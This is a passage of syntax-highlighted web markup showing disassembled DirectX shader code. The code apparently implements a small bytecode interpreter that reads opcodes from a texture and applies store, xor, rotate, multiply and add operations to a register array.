</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>28</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>29</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>30</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>31</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>2</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>3</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>4</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>5</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>6</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>7</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>8</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>9</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>10</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>11</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>12</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>13</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>14</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>x0</span><span class=o>[</span><span class=n>15</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>resinfo_indexable</span><span class=p>(</span><span class=n>texture2d</span><span class=p>)(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=n>_uint</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>),</span><span class=w> </span><span class=n>t0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>yzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>yz</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=o>-</span><span class=n>1</span><span class=p>,</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>xz</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>yz</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>,</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>loop</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>uge</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>z</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1024</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>breakc_nz</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>uge</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>or</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>z</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>if_nz</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>endif</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>mov</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=nf>ld_indexable</span><span class=p>(</span><span class=n>texture2d</span><span class=p>)(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>xyyy</span><span class=p>,</span><span class=w> </span><span class=n>t0</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>mul</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>,</span><span class=w> </span><span class=n>255</span><span class=p>,</span><span class=w> </span><span class=n>255</span><span class=p>,</span><span class=w> </span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=n>ftou</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>xyzw</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>  </span><span class=k>switch</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=nf>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>z</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>15</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ld_uav_typed_indexable</span><span class=p>(</span><span class=n>texture2d</span><span class=p>)(</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>,</span><span class=kt>float</span><span class=p>)</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>xyzw</span><span class=p>,</span><span class=w> </span><span class=n>u0</span><span class=p>.</span><span class=na>yzwx</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mul</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>round_ne</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ftou</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>2</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>z</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>xor</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>3</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>z</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>7</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>bfi</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>8</span><span class=p>),</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>0</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=o>-</span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>8</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>ushr</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r2</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>or</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>4</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>z</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>imul</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>5</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>z</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r4</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>and</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>255</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>r3</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>1</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>break</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>case</span><span class=w> </span><span class=n>l</span><span class=p>(</span><span class=n>6</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>y</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>mov</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=p>,</span><span class=w> </span><span class=n>x1</span><span class=o>[</span><span class=n>r4</span><span class=p>.</span><span class=na>z</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>0</span><span class=o>]</span><span class=p>.</span><span class=na>x</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>iadd</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r0</span><span class=p>.</span><span class=na>w</span><span class=p>,</span><span class=w> </span><span class=n>r1</span><span class=p>.</span><span class=na>x</span><span class=w>
